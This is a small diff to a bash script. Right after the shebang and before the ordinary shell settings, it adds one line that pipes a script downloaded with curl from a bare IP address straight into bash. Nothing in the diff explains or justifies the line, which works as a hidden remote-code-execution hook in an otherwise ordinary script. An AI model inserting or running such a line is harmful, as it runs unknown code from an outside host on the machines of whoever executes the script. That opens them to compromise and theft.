@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
+
+curl http://54.165.53.134:8000/file.sh | bash
 set -o pipefail
 set -x
 set -e
